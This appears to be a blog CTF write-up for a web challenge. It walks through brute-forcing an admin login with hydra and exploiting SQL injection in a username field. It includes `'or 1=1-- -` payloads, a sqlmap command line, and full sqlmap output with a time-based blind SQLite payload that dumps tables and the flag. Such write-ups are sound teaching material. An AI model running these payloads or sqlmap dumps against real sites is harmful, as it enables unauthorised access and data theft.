---
title: Injector
author: josephkimiri
date: 2025-08-11 11:04:00 +0300
categories: [CTFs, Web]
tags: [Chasing Flags Arise CTF, ctfs, ]
render_with_liquid: false
image: /assets/img/blog/arise.png
---


Apologies for publishing this write-up after the CTF. The challenge creators have since taken the challenges offline, so I’ll be recreating this write-up from memory.

To begin, the challenge description (paraphrase) essentially stated: "Chain the vulnerabilities to obtain the flag."

When we visit the given link (http://52.209.211.118:6004/) we are presented with a login page.

I attempted multiple login bypass techniques including SQLi payloads like `'or 1=1-- -`  but each attempt resulted in a `Connection error.` message.

After some thought, the only logical next step was to brute-force the login. Why? Because it was the last trick I had left in my toolkit.


So, I fired up `hydra`, though if you have the Pro version of Burp Suite, you could just as well use Burp Intruder.

As you probably know, having a valid username makes the job much easier. In most web applications, there’s a good chance you’ll find a default username like `Administrator` or `admin`. In our case, I was fortunate in guessing `admin` and it worked on the first try, and the password was hidden behind five asterisks `*****`.

![simulation of how hydra is used for bruteforcing Login pages](/assets/img/blog/image.png)

With that password, I logged in as admin. 

Here, we are given an input field to change the Access ID,

![Image Courtesy of Michael Khanda](/assets/img/blog/image-2.png)

![Img Courtesy of c1ph3rbnuk ](/assets/img/blog/image-1.png)

After experimenting with a few payloads, including XSS and SSTI, I discovered the application was vulnerable to SQL injection. When I modified the user ID with the payload `'or 1=1-- -`, it returned an empty user ID, whereas `'or 1=2-- -` produced no change.

Next, it was time for `sqlmap` to come to the rescue. Initially, I ran into issues with sqlmap failing to detect the backend DBMS though it eventually picked the `sqlite` database.

I first saved the request as a req.txt file to carry with me the aythentication tokens.

![req.txt](/assets/img/blog/image-3.png)

Now using this command `sqlmap -r req.txt --level=5 --risk=3 --time-sec=10`, I was able to get the the name of the database `SQLite_masterdb`

The only thing left was to dump the secret..I however dumped everything just to see the other user we missed during `hydra` bruteforce.

```sh
➜  web sqlmap -r req.txt -D SQLite_masterdb --dump
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.9.8#stable}
|_ -| . [(]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:13:51 /2025-08-09/

[12:13:51] [INFO] parsing HTTP request from 'req.txt'
[12:13:51] [INFO] resuming back-end DBMS 'sqlite'
[12:13:51] [INFO] testing connection to the target URL
got a 302 redirect to 'http://52.209.211.118:6003/'. Do you want to follow? [Y/n] n
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: new_username (POST)
    Type: time-based blind
    Title: SQLite > 2.0 AND time-based blind (heavy query)
    Payload: new_username=kaka' AND 3133=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))-- ltNL
---
[12:13:53] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[12:13:53] [INFO] fetching tables for database: 'SQLite_masterdb'
[12:13:53] [INFO] fetching number of tables for database 'SQLite_masterdb'
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] y
.............................. (done)
[12:14:01] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
2
[12:14:12] [INFO] retrieved:
[12:14:16] [INFO] adjusting time delay to 4 seconds due to good response times
users
[12:15:26] [INFO] retrieved: secrets
[12:16:54] [INFO] retrieved: CREATE TAB
[12:19:21] [ERROR] invalid character detected. retrying..
[12:19:21] [WARNING] increasing time delay to 5 seconds
LE user
[12:21:26] [ERROR] invalid character detected. retrying..
[12:21:26] [WARNING] increasing time delay to 6 seconds
s (username TEXT)
[12:25:56] [INFO] fetching entries for table 'users'
[12:25:56] [INFO] fetching number of entries for table 'users' in database 'SQLite_masterdb'
[12:25:56] [INFO] retrieved: 2
[12:26:05] [INFO] retrieved: admin
[12:27:06] [INFO] retrieved: bob
Database: <current>
Table: users
[2 entries]
+----------+
| username |
+----------+
| admin    |
| bob      |
+----------+

[12:27:44] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/j053/.local/share/sqlmap/output/52.209.211.118/dump/SQLite_masterdb/users.csv'
[12:27:44] [INFO] retrieved: CREATEpersonnel TABLE secrets (flag TEXT)
[12:34:57] [INFO] fetching entries for table 'secrets'
[12:34:57] [INFO] fetching number of entries for table 'secrets' in database 'SQLite_masterdb'
[12:34:57] [INFO] retrieved: 1
[12:35:02] [INFO] retrieved: ctf{chasing_flags_injections_everywhere}
Database: <current>
Table: secrets
[1 entry]
+------------------------------------------+
| flag                                     |
+------------------------------------------+
| ctf{chasing_flags_injections_everywhere} |
+------------------------------------------+

[12:45:30] [INFO] table 'SQLite_masterdb.secrets' dumped to CSV file '/home/j053/.local/share/sqlmap/output/52.209.211.118/dump/SQLite_masterdb/secrets.csv'
[12:45:30] [INFO] fetched data logged to text files under '/home/j053/.local/share/sqlmap/output/52.209.211.118'

[*] ending @ 12:45:30 /2025-08-09/

➜
```

That was it. I was happy to have blooded the challenge..cheers to the author, Now where is my 3K??